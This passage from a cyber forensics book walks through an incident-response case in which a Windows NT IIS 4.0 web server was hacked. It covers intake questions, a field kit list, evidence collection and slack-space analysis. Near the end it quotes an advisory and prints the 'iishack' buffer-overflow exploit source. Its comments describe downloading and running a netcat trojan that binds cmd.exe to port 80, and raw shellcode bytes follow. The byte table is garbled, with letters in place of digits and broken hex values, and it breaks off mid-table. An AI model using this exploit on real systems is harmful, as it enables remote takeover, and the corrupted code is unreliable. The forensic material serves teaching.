    **Note:** Performing a backup via SCSI cables is as least nine times faster than using a parallel cable, so use SCSI when you can.
*   Does the box have CD-ROM and diskette drives? \[Yes. Most later generation systems do have these, but some older systems do not. If these are not available, you would have to be sure you have access to an external CD-ROM drive and an external diskette drive. You may have to order these drives if the client does not have them for some reason.\]
*   Is this an Intel platform (such as Reduced Instruction Set Computer \[RISC\] or Scalar Processor Architecture \[SPARC\]) or something else? \[Yes: Compaq Proliant 3000, PII with dual-800 MHz\]. However, be aware that the client may give you an answer because they think it is true or they just do not want to tell you that they do not know. When you get on site you find out that what you were told is incorrect. This can also be the case with other questions you ask.\]
*   Is this system in a classified environment? \[No. If it were, you would need to ensure that your appropriate clearance was faxed to the client so that you would have access to the system when you arrived. Also, if it were a classified environment, you would need to find out whether you can bring in your cellular telephone, etc. If you cannot, be sure to make proper arrangements for communications.\]
*   When I arrive on site, I will need your system experts at my side for the NT box itself and for items relating to their network infrastructure (firewall, router, switch, etc.). Please provide me with their names and contact information (e-mail, telephone).  
    **Note:** You cannot be an expert on everything. You need to have a general understanding of the equipment that composes a network infrastructure, but you also need to have an in-depth expert sitting with you for each device you need to access. If the client does not have the expertise, arrange for that expertise via a consulting firm or some other avenue open to you.
*   I will also need a technician available who can walk me through the cabling plant and wiring closets associated with the web server that was hacked. Please provide me with names and contact information (e-mail and telephone). \[Usually, the individuals who really know the cabling layout of a facility are the ones who pulled the cable. You need to be able to trace a cable starting from the back of the hacked system all the way to the wiring closet (in ceilings and under floors). Do not depend on someone’s word for the route it takes. The individual could be wrong and the cable could have been tapped somewhere. You need to see for yourself.\]
*   This incident should not be mentioned to anyone who does not have a need to know. \[This is common sense. The client should not advertise that the incident has occurred, nor should the client advertise that a cyber forensic investigator (CFI) is coming to investigate the incident. Keep things as low key as possible. If you do not, you may end up with the news media at your door or tip off the perpetrator who committed the malicious act. If it is an insider, the person may be able to cover his or her tracks before the CFI arrives.\]
*   I will need to interview some personnel. If your policies state that someone from human resources (HR) must be present, please provide me with at least two HR names and their contact information (e-mail and telephone). \[An HR person is required in this case.\]  
    **Note:** If this is a union shop, a contract or union agreement may stipulate that a union steward must be present for any and all questioning of a union employee. Be sure not to violate this stipulation. The perpetrator could be set free on this technicality.
*   Do the system administrator or security personnel review system logs on a regular basis? \[No. This is bad news, but not surprising. Many clients do not turn on system auditing for system performance and disk storage reasons, or they may have very limited logging. You may also run into the situation in which logging is active, but no one has been given time to review the system logs to check for signs of malicious activity on the system or network.\]
*   Do you have an intrusion detection system (IDS) in place? \[No, but we do have a Cisco PIX firewall in place.\]  
    **Note:** They should have both. Information on IDSs and firewalls is available in the appendices to this book.
*   Please have a copy of the backup tapes for the system available for my use. \[Notice that I said a copy, not the original tapes. Also, find out what type of backup system they use. You must be sure you have the right equipment to restore the backup tapes you are given. This type of equipment may be bought or rented. The client may even have an extra system they will allow you to take back to your lab to use during the investigation.\]
*   Was this NT system serviced recently for any reason (in the past four weeks)? \[No. However, the box cover is not kept locked and keys are with the box. The room the box sits in is locked, but several people have keys. This is a very insecure situation. First, the NT web server cover should have been locked. The keys for the cover should be in the hands of the physical security department, as should the keys that allow access to the room housing the web server (which should have been locked). If the system was serviced recently, you would need to see all the paperwork involved with this. Then check the box to ensure that what was said to have been done was actually done, nothing more and nothing less. Sometimes a service repair person will “plant” hardware/software for malicious activities.\]
*   Were any disgruntled employees released during the past four weeks? \[None that we are aware of. Notice the way the question was answered. In large organizations, it is possible for people to have been fired with few, if any, people who worked around the person even knowing about it. They may think the person is on vacation, sick, etc. Be sure to check with HR on this issue. If any disgruntled employees had been terminated, you would need to obtain their user IDs for the system and carefully check the logs for activities performed under their user IDs. They could hide their activities in various ways (depending on their level of expertise), but this is a good way to begin.\]
*   Do you know of any current disgruntled employees? \[None that we are aware of. Again, check on this in a discrete fashion. Listen closely to the people you interview. You may find one.\]
*   Have there been any other security incidents in the past three months? \[None that we are aware of. Take this with a grain of salt. It is possible that your client was hacked a year ago but was unaware of it. If you check out some of the websites that harbor information of this type, you may have a surprise for your client. Two places to check would be rootshell.com and ATTRITION.org. There are numerous others, but these are two of the best.\]
*   Who has actual physical access to this NT4 box? \[A secretary keeps the key and gives it out to those needing it. No key log is maintained. Obviously, there is a definite security problem here, although this situation is common. No one should be able to obtain the key to a locked server room without proper authorization.\]
*   Is this system outside or inside the firewall? \[It is inside the firewall with firewall rules allowing specific IP/PORT access. Ports 80 and 21 are opened on the firewall so that personnel coming in via the Internet can obtain access to the web server. Port 80 is commonly an open port on a firewall because all http traffic (Internet web traffic) uses this port. Port 21 is also commonly open on a firewall because it is the ftp port (allows file transfers). This is another good reason for also having an IDS in place. Although the firewall is potentially allowing malicious traffic through on ports 21 and 80, an IDS may be able to detect the malicious traffic and terminate the connection – or do other things, depending on how the IDS is configured.\]
*   Is this system for Internet use only or does it have another network interface card (NIC) in it that connects it to the organization’s intranet? \[Both Internet and intranet. There is one NIC card for the Internet and a virtual host for the intranet (two IP addresses).\]  
    **Note:** This configuration is quite insecure. Those who use it are risking their internal networks.
*   What are all of the purposes of this system? \[This web server is used to hold an Oracle database that contains the results of research we have done on various products and companies. By law, we are required to make this information public.\]
*   What ports (Transmission Control Protocol \[TCP\]/User Datagram Protocol \[UDP\]) are being used on the system? For what purpose? \[TCP 80 and 21 are the only ones we believe to be open. The box is also set up for NT Remote Administration.\]
*   I would like to see a copy of the original purchase order for the system, showing its original configuration as purchased. I would also like to have a copy of any servicing/modifications made to the system from a hardware perspective. \[We have the original purchase order, configuration, and modifications on site and available for your perusal. However, this system was loosely maintained so we are unsure whether the system is actually configured the way our paperwork indicates.\]  
    **Note:** You can run a software program called InsightManager on NT to identify the current configuration. If the same program was run at an earlier date, you can compare the old report with the new one you just made.
*   Were any new applications recently (in the past four weeks) added to or removed from the system? \[Three system administrators stated that they did make some application file changes, but they did not document which files were changed.\]

The above question and answer session occurred during my trip to the airport in the cab and while I waited to board the airplane at the airport.

> **Note:** If this had been an established client, I would have had the answers to most of the above questions at the time when the client initially contacted me. An established client has a checklist to use when a network security incident occurs. The client quickly works through the checklist, providing answers as well as possible, and e-mails me the results via a secure encrypted link. This is a big timesaver. Saving time at the beginning of an investigation makes it more likely that the resolution of the investigation will be successful. The first 24 hours of a new case are critical.

I am now on the airplane, heading to Boston. My carry-on luggage is above my seat, stored safely away. This is an important point. Never put your Cyber Forensics Equipment Container (CFEC) in the hands of the airline personnel. Too much can go wrong. You have expensive (and sensitive) hardware and software and are responsible for it. If you arrive at the client site without your CFEC, you have a serious problem. Always keep your Cyber Forensics Equipment (CFE) in carry-on luggage that has wheels and a handle and is a size that fits in the compartment above your airplane seat. The contents of a CFEC may vary to some degree, depending on your work, but the following is a good standard to follow:

*   Velcro fasteners to keep cables contained
*   Hard drives that will work in the system(s) you will investigate
*   Read/write CD-ROMs
*   A wireless laptop loaded with vulnerability analysis, IDS, CF software, etc.: 
    *   Mijenix Fit It Utilities CD-ROM
    *   Norton Utilities CD-ROM
    *   NTI (New Technologies, Inc.) CF tools
    *   EnCase
    *   Access Data System Management Toolkit
    *   L3 Network Security Expert
    *   ISS Real Secure, Internet Scanner, System Scanner
    *   NeoTrace
    *   Visual Route
    *   Microsoft Office
    *   Internet and e-mail access
    *   Antivirus software
    *   PERL
    *   Microsoft Visual C++ 6.0 or later
    *   Intel/Motorola Assembler
    *   Fortran
    *   Digital camera
    *   Bootable to Windows 95/98/2000, Linux, Solaris, Macintosh
    *   Network ICE (personal laptop firewall)
    *   Partition Magic and Boot Magic
    *   VMware
    *   MatLab
    *   Mathcad
    *   QuickTime
    *   Adobe Acrobat
    *   NetScan Tools Pro
    *   War dialer
    *   Analyst’s notebook
    *   Big Business Directory
    *   Dragon voice recognition
    *   NFR
    *   SafeBack
    *   Video camera (no active microphone)
    *   Boot diskettes for various operating systems/version levels
*   Electronic copies of any documentation needed (paper is too bulky)
*   Cables: all SCSI types, parallel, serial, telephone (RJ11), network (RJ45)
*   Tape recorder: hand held, digital with IBM Via Voice and regular tape types
*   Technical Surveillance Counter Measures (TSCM) equipment (The concern is that someone may have planted a transmitter.): 
    *   Radio frequency (RF)/microwave transmitter locator
    *   White noise generator
*   DAT tape drive (I recommend Ecrix VXA-1 External SCSI.)
*   Extra pens/pencils and a wire-bound notepad
*   A pair of Motorola radios (walkie talkies)
*   Computer repair tool kit (includes antistatic wrist line)
*   Extra battery and hard drive (duplicate of your current drive) for your laptop
*   Paper and electronic copies of all e-mail/telephone numbers you might need
*   Jaz Drive with 2-MB disks
*   All power cords, device connectors, and adapters required
*   Cellular telephone
*   TechCard (to obtain 24/7 support on nearly any product)
*   Credit cards, driver’s license, badges, etc. required
*   Passport
*   Portable color printer that connects to your laptop (with extra ink cartridge)
*   5.25-inch diskettes with labels
*   Surge protector
*   Sequoia pocket books: Pocket Partner, Pocket PCRef, WinRef, TechRef
*   Imation Super Disks for Macintosh computers
*   Color-coded stickers (circular)
*   Cable labels
*   Evidence labels and chain of custody forms
*   Erasable and nonerasable markers
*   Cameras (digital and film type)
*   Kensington Sonic Lock Alarm
*   Kensington laptop security cable
*   Null modem cable/Lap Link cable
*   NetWare CD-ROM or diskettes
*   Four-port mini 10/100 network hub
*   Mini projector for laptop
*   Fluke Network Meter
*   Duplicator (to make second copy of the bitstream backup)

This may seem like a large amount of equipment, but it all packs well into one carry-on piece of airplane luggage. Lest I forget, there are two more important details:

1.  Be sure you have notified at least one person (preferably two or three) to let them know where you are going; provide them with emergency contact information.
2.  Be sure to inform your computer crime attorney of your location, contact information, and general information pertaining to the case. Your attorney should expect to be contacted and therefore should readily respond to a ringing cell telephone or pager.

I arrived at the client site, Nortelem, in Boston, Massachusetts, and was met at the gate by a security guard, who requested proper identification and then notified Bob Jacobs of my arrival. The security guard inspected my CFEC and required me to sign a statement stipulating my understanding of company policy pertaining to the equipment I am bringing in. Bob picked me up at the gate and we went to a conference room. The first thing I always do when I arrive at a site is to hold a 15-minute briefing. (After reviewing the information Bob sent me, I contacted him and told him who I would like to have available as soon as I arrived on site.) The briefing covered the following topics:

*   Was physical security able to secure the area where the security incident occurred?
*   Have you learned anything new since we last communicated?
*   Do you have available the personnel I requested?
*   Web server system administrators (at least two of them)
*   Firewall, switch, router experts
*   NT4 operating system expert
*   Applications expert for the compromised system
*   Legal, HR, and union (if necessary)

In summary, this is the procedure I followed.

*   Begin the evidence collection process. This entails obtaining a bitstream backup of the victim systems and collection of logs from routers, switches, firewalls, etc. All evidence collection is done in accordance with DOJ (Department of Justice) guidelines so the client can use the evidence in a court of law if desired.
*   Obtain a copy of the victim system backups for the past week.
*   Interview personnel involved with the victim systems.

Once I have obtained the abovementioned backups, logs, and tapes and completed the interviews, I will return to my lab and begin the analysis stage at my Cyber Forensics Lab (CFL). Using the backups, logs, tapes, interview information, and bitstream backup, I will determine:

*   Were any changes made to the operating system?
*   Were any changes made to applications or data?
*   Did the perpetrator plant any hidden software on the systems?
*   Did the perpetrator steal any data?
*   Did the perpetrator modify any data?
*   How did the culprit manage to break into the system?
*   Why did the culprit break into the system?
*   Who was the perpetrator?
*   Where does the perpetrator reside?
*   What type of machine was used to launch the attack?
*   What hacking tools did the perpetrator use?
*   Has the perpetrator compromised any other systems at the client site?
*   When did the perpetrator compromise the systems?
*   I will also tell the client how to close up the security holes found.

If necessary, I will keep the client abreast of any new developments on a daily basis. I will also provide the client with a complete written report upon the close of the investigation.

I try to use no more than 15 minutes for that briefing. Now I will move on to the system that was compromised. The system resides in a secured area behind locked doors. First, I carefully open the case of the computer system and look for anything unusual. I take photographs of the system with and without the case, along with pictures of the general area in which the system resides. I also videotape the area. To check (or control) for “bugs” (RF/microwave transmitters), I scan the room using a Boomerang. A really thorough scanning job could take hours. However, I am not making a thorough scan. I am only looking for a quickly planted “amateur” transmitter in this case. Finding nothing, I set up my white noise generator as a safeguard against covert monitoring. The thoroughness of your check depends on your level of paranoia and the case you are working on. Keep in mind that laptop and workstation/server speakers can be set up as microphones. Your client or the perpetrator may be listening to everything you say.

I decide to use my Ecrix VXA-1 tape drive to hold the bitstream backup I am about to obtain. I attach the VXA-1 to a SCSI port on the back of the box, put in my boot diskette that contains SafeBack, and power up the system. I go through the SafeBack screens and then the bitstream backup begins. Once I am sure the backup is proceeding as planned (I watch for about five minutes), I leave the room to interview various personnel. I ensure that a guard locks the door behind me and that the guard will remain until I return. There are no other entrances into the room (through the ceiling, floors, or a window). It will take a few hours for the bitstream backup to complete, so the best use of my time now is to interview various people. I check my watch and record the date/time it shows. Next to that I record the date/time shown on the compromised web server. As I move through the various items in the network infrastructure in the upcoming paragraphs, I always note the date/time shown on all firewalls, routers, switches, and any other equipment from which I will be collecting logs. Later, in case there are time discrepancies, I will be able to correlate all log data based on the times I have recorded, allotting for any deviations.

Again, after having reviewed the information I requested earlier from Bob Jacobs, I sent him a list of personnel I wanted to interview. I did not know all their names, so if I did not know a name, I gave Bob a short description of the type of person I needed to speak with. He provided me with the appropriate contact information and told the people to be available for me on an as-needed basis. It is not always easy to obtain access to the people you need to speak with (meetings, vacations, illness, at another location, in training, etc.). The people I want to speak with are:

*   Cabling technician
*   A few of the system/domain administrators
*   Firewall, router, switch, VPN experts
*   Operating system expert
*   Applications expert
*   Individuals who actually construct/modify the web pages
*   Network security personnel

I begin with the cabling technician and ask him to take me along the path from where the network cable leaves the back of the compromised Web server to where it actually connects to a switch or hub in a wiring closet. We follow the cable and it does indeed lead to exactly where he said it would, with no detours. The surprise I receive, however, is that even though the wiring closet is locked, the cabling technician walks to a secretary’s desk, opens a drawer, and pulls out the key to open the wiring closet. I ask him about this and he tells me that no key log is kept and that whoever knows the key location has access to the wiring closet. This definitely turns on a red flashing light for me. I make a note of this because it is definitely poor physical security.

While in the wiring closet, I use my camera to take some pictures of the layout. The diagrams I had been given of the network infrastructure indicated that to reach the web server from the Internet, I would need to pass through three routers and two firewalls. Assuming this was correct and assuming (for now) that the routers and firewalls were properly configured, security from the Internet to the web server should be adequate. However, I never depend on the diagrams provided to me. They are only a place to start and give me a general idea of the network layout. To double-check the diagrams, I unplug the web server’s cable from the device it was connected to in the wiring closet and plug in my laptop (my laptop was configured so that it could access their network, giving it the IP address the web server had been using) to the port. I first do a “ping” to a couple of local devices on their network to be sure I am tied in properly. Everything works fine. I next do a “netstat -nr” from a DOS prompt to take a look at active routes and active connections.

My next step is to check the hop count out to a known IP address that resides on the Internet. I was expecting to see at least five hops because of the three routers and two firewalls on the diagram. The hop count out to the known IP address on the Internet was one! That was a shocker. This indicated that there was a route running between the compromised web server and the IP address on the Internet with only one device in between them. The cable technician recognized the address as one of their routers. This meant that only a router stood between the compromised Web server and the Internet – very interesting … and not very secure. I thanked the cable technician for his time and contacted the Router Administrator that I was to interview.

Steve Wier was the senior person responsible for the corporate routers. I explained to him the situation that I had just encountered, and he immediately took me to the proper router. Unfortunately, this was the first time that Steve had been on this router. I quickly learned that this was only Steve’s second week on the job. The individual who had the position prior to Steve (James Roberts) left the company two weeks earlier. I asked Steve for contact information for James Roberts, but Steve had none. I would have to check with HR. Steve and I checked the router’s Access Control List (ACL) and found it to be nearly empty, with no controls in place relevant to the compromised web server. I documented this and told Steve to immediately set up a proper ACL on this router and then to check the other routers. He heartily agreed. I could not hold Steve responsible for improper ACLs since his first week with the company was spent in various required corporate training programs in the HR department. In his second week, he was only beginning to become familiar with the corporate network topology. My next telephone call was to the individual who had provided me with the network diagram (Terry Reiner). I informed Terry of our findings pertaining to the router. He did not believe me until I conferenced in Joe Freid (cable technician) and Steve Wier. Based on our teleconference, Joe got his group together and they began what turned out to be a weeklong adventure of tracing cables and ensuring they had a solid physical map of the network layout. They made a number of changes to their infrastructure map and removed cabling that was no longer in use. Terry briefed all his firewall and switch engineers/technicians and they did a marathon session of checking and double-checking each other on firewall rule sets and switch configurations. (This also took about a week, including testing.) A number of changes/enhancements had to be made. Before they began doing this, Terry obtained a printout for me of all the firewall rule sets and switch configurations. James did the same for the routers. Joe provided me with a map of how the cabling was actually laid out before his group made changes and after the changes were made. I, along with James, Joe, and Terry, kept Bill Miter (the senior network security analyst) informed of our progress on a daily basis.

The way the above description reads, it probably indicates that I was there for an entire week. That was not the case. I was there for only one day, which was the amount of time I needed to collect the bitstream backup and logs from various devices (firewalls, routers, switches, web server) and interview the personnel I needed to speak with. Once I left, information was exchanged via secured communications. We also set up code words that were meaningful to all of us. Usually, I am at an unclassified site for one or two days and take what I need back to my lab in the Washington, D.C. area and perform my analysis. If I am working at a classified site, I have to obey their rules, which means I will probably be at the classified site a full one or two weeks (or more), doing all my analysis on site. (If I need anything, they provide it. I usually cannot leave with anything, depending on the site.) So, at the end of the first long day, I returned to the compromised web server, verified the bitstream backup via SafeBack, and then used a duplicating device to make a second copy of my bitstream backup. Next, even though this web server is not to be disturbed without my permission, I need to ensure that I know if someone tampers with the hard drive after I leave the client site. I do this by obtaining a mathematical signature of the hard drive using a CF program called DiskSig. If this drive is tampered with in the least, it will alter the disk signature I have obtained, thus alerting me to the fact that the hard drive was altered in some manner while I was away. I will obtain two signatures, one that includes the boot sector and one that does not. I placed a diskette in drive A that contains the DiskSig program and typed:

*   disksig /b c: > a:\\NortlSig.bot
*   disksig c: > a:\\NortlSig.nob

The .bot file contains the signature that includes the boot sector. The .nob file does not contain the boot sector. Now I remove my diskette, properly label it and close up shop for the day, letting the guard know that the web server should remain secured and that I have completed my work and will be leaving to perform my analysis. *Note:* Always make a second copy of the bitstream backup and check both copies before leaving the site to be sure you can access them properly. Also be sure to run an MD5 checksum and check that both copies have the same mathematical value (in this way, you know they are exact duplicates of one another). When returning to your lab, send one copy by Fed Ex to your lab (or home) and take the other copy with you on the airplane. If both are kept together, something could go wrong and you could lose both of them. When shipping the copy via Fed Ex, follow the evidence shipping guidelines provided by the Department of Defense Computer Forensics Laboratory (DCFL) at [http://www.dcfl.gov](http://www.dcfl.gov).

Before leaving, I briefed Bob Jacobs (CEO of Nortelem) on the events of the day and ensure that he has all of my contact information and a schedule of how I will proceed. Remember that it is always best to remain kind, patient, and diplomatic with all the people you meet during an investigation *–* even if they do not return the favor. You never know when you may need their assistance or a recommendation in the future. Do not burn any bridges if you can help it. Finally, be sure to check that you have all the hardware/software that you brought with you before you leave. It is easy to leave something behind.

Back on the airplane, homeward bound for D.C., I reflected on the events of the day and quickly fell asleep. Around 10 p.m., I was back in D.C. and headed for home. I need a good night’s sleep before beginning analysis of the bitstream backup, logs, etc. Unless it is an extreme emergency, do not try to do an analysis when you are tired. It leads to mistakes and missed clues. Get a good night’s sleep and start fresh in the morning. Before going to bed, place all your evidence inside a safe, being sure to keep it separate from any other case you are working or have evidence for. You have the only access to this safe, which helps to ensure that you maintain proper chain of custody for all evidence.

In the morning, I was awakened by the doorbell. It was Fed Ex, delivering the bitstream backup evidence that I shipped the day before. I do not open packages of this type (as long as they are in good condition and show no damage). I consider this to be my evidence copy that I never touch. I will perform my analysis on the other bitstream backup that I made using SafeBack. Once I have had breakfast and I am ready for the new day, I head to the lab and set up my analysis machine with new hard drives that have never been used before. (It is a tower holding five new 100-GB hard drives.) The hard drive utilized in the compromised web server was 60 GB. The new hard drives are important. You want to ensure that you do not contaminate the evidence from this case with information from a prior case. I must emphasize that thorough documentation is critical during the entire investigative and analysis process. Keep detailed notes about everything you do, even if you do not include everything in your final report to the client. Assume that every case you handle will go to court (even though 99% of them will not).

Be sure your Cyber Forensics Analysis System (CFAS) is set to the correct date/time. With the new hard drives in place on a CFAS, again use SafeBack – this time to restore the bitstream backup made to the CFAS. *Note:* Your CFAS always remains a standalone machine and is never connected to the Internet. If configured otherwise, you risk contaminating your evidence. With the restoration completed, now turn to the analysis phase. Knowing how to use a CF tool is one thing. Knowing which tool to use in which circumstance is entirely another thing. Excellent investigative skills are also necessary, and you must think quickly on your feet. You will have to apply what you have learned in earlier sections of this book.

> **Note:** The new hard drives are labeled C, D, E, F, and G.Drive C contains the restored bitstream backup of the compromised system, cf. tools are placed on drive D.

The first item to obtain is the slack space on drive C. The results from all our tools will be placed on drive D. To obtain the slack space from drive C and place it in a file on drive D named Nortelem\_Slack, type (from drive D):

 getslack Nortelem\_Slack c:

Now I want to obtain the free space (unallocated space) that is available on drive C and place it in a file on drive D named Nortelem\_Free. This will allow me to obtain deleted files or data that have not been overwritten. From drive D, type:

 getfree Nortelem\_Free c:

For both Nortelem\_Free and Nortelem\_Slack, I want to generate an MD5 digest and a CRC checksum. This is done for purposes of file integrity. I will place this information in filenames with an extension of.crc to easily recognize them later. All this is done on drive D:

 crcmd5 Nortelem\_Slack > Nortelem\_Slack.crc

 crcmd5 Nortelem\_Free > Nortelem\_Free.crc

Now I create a directory tree digest file of drive C. Include MD5 computation and any files that were deleted. Send the output to drive D and name the file NorDirTr. *Note*: When I want to read the contents of file NorDirTr, I must use the FileCnvt program to make it a.dbf file (NorDirTr.dbf), which can then be read by Excel:

 filelist/m/d d:\\NorDirTr c:

I now begin an analysis of the slack file I created earlier (Nortelem\_Slack.S01). I want to use a tool that will make binary data printable and extract potentially meaningful data from a large volume of binary data. I will use Filter\_I for this purpose. Since both Filter\_I and the slack file reside on drive D, I will be operating from that drive.

 Run Filter\_I, choose Filter, select Nortelem\_Slack.S01 file

Note that the filename created from this run of Filter\_I is Nortelem\_Slack.F01. Also, notice that all non-ASCII data was replaced with spaces. Now run Filter\_I on Nortelem\_Slack.S01 using the other three options (Intel, Names, Words).

So I now have three additional files:

1.  Nortelem\_Slack.F02: Here I notice some English language patterns, passwords, user Ids.
2.  Nortelem\_Slack.F03: Here I find some names: xero, most-hated, Phiber Optik, infamous, Steve, Laura.
3.  Nortelem\_Slack.F04: Here I obtain some messages and potential filenames:  
    Stack overflow error.  
    Divide by zero error.  
    Not enough space for environment.  
    … change English units to metric units…

This is serious. I immediately contact Nortelem with this information. They need to check their databases to see if English units in calculations have been changed to metric units. Even though this was found on the web server, since their intranet and Internet are tied to the same system, if this system was trusted by other systems within their corporate network, other systems could be adversely affected.

 ncx.exe

 “… buffer overflow …”

I notice a “telnet” to the box via port 80. I observe signs of someone being sloppy and trying to load/execute some code. I also see:

 IIS 4.0 remote buffer overflow

Based on the above information, I will quickly go to various search engines and network security sites, looking for exploits that have the abovementioned characteristics. The sites searched are:

*   yahoo.com
*   dogpile.com
*   Usenet via deja.com
*   eEye.com
*   hackernews.com
*   rootshell.com
*   attrition.org
*   antionline.com

At rootshell.com, I find the following information that directly relates to the case I am working on:

*   eEye Digital Security, an eCompany LLC venture, dedicated to network security and custom network software development, has unveiled one of the most vulnerable security holes on the Internet to date. The vulnerability exists in the latest release of Microsoft Internet Information Server, the most commonly used Windows NT Web server on the Internet.
*   The vulnerability allows arbitrary code to be run on any Web server running the latest release of Microsoft Internet Information Server. Utilizing a buffer overflow bug in the Web server software, an attacker can remotely execute code to enable system-level access to all data residing on the server.
*   eEye Digital Security came across the vulnerability while testing Retina™ The Network Security Scanner. Retina is a network security auditing and reporting tool that is currently in beta testing. One of Retina’s features utilizes an Artificial Intelligence engine that is designed to think like a hacker, collecting data and mining for information from the target network or Web server. The end result of this data is used to perform auditing on the network and find potential vulnerabilities and weaknesses in the network security.
*   eEye Digital Security has notified Microsoft about the security breach and has been working with the Microsoft Security Team to help provide a fix. eEye Digital Security did provide Microsoft with an immediate patch for the Web server and complete details on how the vulnerability can be exploited remotely to gain system-level access to the Web server’s data. Complete details of the vulnerability and the exploit will be available on eEye’s Web site ([www.eEye.com](http://www.eeye.com)) after Microsoft releases an official fix for the Web server.

Systems affected:

*   Internet Information Server 4.0 (IIS4)
*   Microsoft Windows NT 4.0 SP3 Option Pack 4
*   Microsoft Windows NT 4.0 SP4 Option Pack 4
*   Microsoft Windows NT 4.0 SP5 Option Pack 4

## The Fallout

Almost 90% of the Windows NT Web servers on the Internet are affected by this hole. Even a server that is locked in a guarded room behind a Cisco PIX can be broken into with this hole. This is a reminder to all software vendors that testing for common security holes in your software is a must. Demand more from your software vendors.

## Vendor status

We contacted Microsoft on June 8, 1999. eEye Digital Security provided all information needed to reproduce the exploit and how to fix it. The Microsoft security team did confirm the exploit, and are releasing a patch for IIS.

## The target

Say for this example we are targeting some random Fortune 500 company. Take your pick. We want to pretend this company has some “state-of-the-art” security. They are locked down behind a Cisco PIX and are being watched with the best of Intrusion Detection software. The server only allows inbound connections to port 80.

## Let’s dance

We have crafted our exploit to overflow the remote machine and download and execute a trojan from our web server. The trojan we are using for this example is ncx.exe; ncx.exe is a hacked-up version of net cat.exe. The hacked-up part of this netcat is that it always passes -1 -p 80 -t -e cmd.exe as its argument. That basically means netcat is always going to bind cmd.exe to port 80. The exe has also been packed slightly to make it smaller. Instead of a 50k footprint, it is 31k. So we run our exploit:

The code required to perform this exploit also existed at rootshell.com. This is the Intel assembly language code from the site that performs the exploit that was done on Nortelem’s web server.

 ; IIS 4.0 remote overflow exploit.

 ; (c) dark spyrit - barns@eeye.com

 ;

 ; greets & thanks to: neophyte/sacx/tree/everyone in #mulysa and

 ; #beavuh... and all the other kiwi’s except ceo.

 ;

 ; credits to acp for the console stuff..

 ;

 ; I don’t want to go in too deeply on the process of exploiting buffer

 ; overflows... there’s various papers out there on this subject, instead I’ll

 ; give just a few specifics relating to this one..

 ;

 ; Microsoft was rather good to us on this occasion, stuffing our eip value

 ; directly into a register then calling it.. no need to stuff valid addresses

 ; to make our way through various routines to eventually return to our

 ; address... but, unfortunately it wasn’t all smooth sailing.

 ; Various bytes and byte sequences I was forced to avoid, as you’ll quickly

 ; notice should you bother debugging this.. various push/pop pairs etc.

 ; I don’t bother with any cleanup when all is done, NT’s exception handling

 ; can cope with the mess :)

 ;

 ; The exploit works by redirecting the eip to the address of a loaded dll,

 ; in this case ISM.DLL. Why?

 ; Because its loaded in memory, is loaded at a high address which gets around

 ; the null byte problem.. and is static on all service packs.

 ; The code from ISM.DLL jumps to my code, which creates a jump table of

 ; of functions we’ll need, including the socket functions.. we do this

 ; because unfortunately the dll’s import tables don’t include nearly enough

 ; of the functions we need..

 ;

 ; The socket structure is created and filled at runtime, I had to do this

 ; at runtime because of the bad byte problem.. after this a small buffer is

 ; created, a get request issued to the web site of the file you want to

 ; download.. file is then received/saved to disk/and executed..

 ; Simple huh? no not really :)

 ;

 ; Have fun with this one... feel free to drop me an e-mail with any comments

 .

 ;

 ; And finally, heh.. “caveat emptor.”

 ;

 ;

 ; you can grab the assembled exe at [http://www.eEye.com](http://www.eeye.com).

 ;

 ; to assemble:

 ;

 ; tasm32 -ml iishack.asm

 ; tlink32 -Tpe -c -x iishack.obj,,, import32

 . 386p

 locals

 jumps

 .model flat, stdcall

 extrn GetCommandLineA:PROC

 extrn GetStdHandle:PROC

 extrn WriteConsoleA:PROC

 extrn ExitProcess:PROC

 extrn WSAStartup:PROC

 extrn connect:PROC

 extrn send:PROC

 extrn recv:PROC

 extrn WSACleanup:PROC

 extrn gethostbyname:PROC

 extrn htons:PROC

 extrn socket:PROC

 extrn inet\_addr:PROC

 extrn closesocket:PROC

 . data

 sploit\_length equ 1157

 sploit:

 db “GET/”

| db 041h, || 041h, || 041h, || 041h, || 041h, || 041h, || 041h ||   ||   ||   ||   ||   |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| db 576 dup (041h) |
| db 041h, || 041h, || 041h, || 041h, || 041h, || 041h, || 0b0h, || 087h, || 067h, || 068h, || 0b0h, || 087h |
| db 067h, || 068h, || 090h, || 090h, || 090h, || 090h, || 058h, || 058h, || 090h, || 033h, || 0c0h, || 050h |
| db 05bh, || 053h, || 059h, || 08bh, || Odeh, || 066h, || 0b8h, || 021h, || 002h, || 003h, || 0d8h, || 032h |
| db 0c0h, || 0d7h, || 02ch, || 021h, || 088h, || 003h, || 04bh, || 03ch, || Odeh, || 075h, || 0f 4h, || 043h |
| db 043h, || 0bah, || 0d0h, || 0l0h, || 067h, || 068h, || 052h, || 051h, || 053h, || 0ffh, || 012h, || 08bh |
| db 0f0h, || 08bh, || 0f 9h, || 0fch, || 059h, || 0blh, || 006h, || 090h, || 05ah, || 043h, || 032h, || 0c0h |
| db 0d7h, || 050h, || 058h, || 084h, || 0c0h, || 050h, || 058h, || 075h, || 0f4h, || 043h, || 052h, || 051h |
| db 053h, || 056h, || 0b2h, || 054h, || 0ffh, || 012h, || 0abh, || 059h, || 05ah, || 0e2h, || 0e6h, || 043h |
| db 032h, || 0c0h, || 0d7h, || 050h, || 058h, || 084h, || 0c0h, || 050h, || 058h, || 075h, || 0f 4h, || 043h |
| db 052h, || 053h, || 0ffh, || 012h, || 08bh, || 0f0h, || 05ah, || 033h, || 0c9h, || 050h, || 058h, || 0blh |
| db 005h, || 043h, || 032h, || 0c0h, || 0d7h, || 050h, || 058h, || 084h, || 0c0h, || 050h, || 058h, || 075h |
| db 0f4h, || 043h, || 052h, || 051h, || 053h, || 056h, || 0b2h, || 054h, || 0ffh, || 012h, || 0abh, || 059h |
| db 05ah, || 0e2h, || 0e6h, || 033h, || 0c0h, || 050h, || 040h, || 050h, || 040h, || 050h, || 0ffh, || 057h |
| db 0f4h, || 089h, || 047h, || 0cch, || 033h, || 0c0h, || 050h, || 050h, || 0b0h, || 002h, || 066h, || 0abh |
| db 058h, || 0b4h, || 050h, || 066h, || 0abh, || 058h, || 0abh, || 0abh, || 0abh, || 0blh, || 021h, || 090h |
| db 066h, || 083h, || 0c3h, || 016h, || 08bh, || 0f 3h, || 043h, || 032h, || 0c0h, || 0d7h, || 03 ah, || 0c8h |
| db 075h, || 0f8h, || 032h, || 0c0h, || 088h, || 003h, || 056h, || 0ffh, || 057h, || 0ech, || 090h, || 066h |
| db 083h, || 0efh, || 010h, || 092h, || 08bh, || 052h, || 00ch, || 08bh, || 012h, || 08bh, || 012h, || 092h |
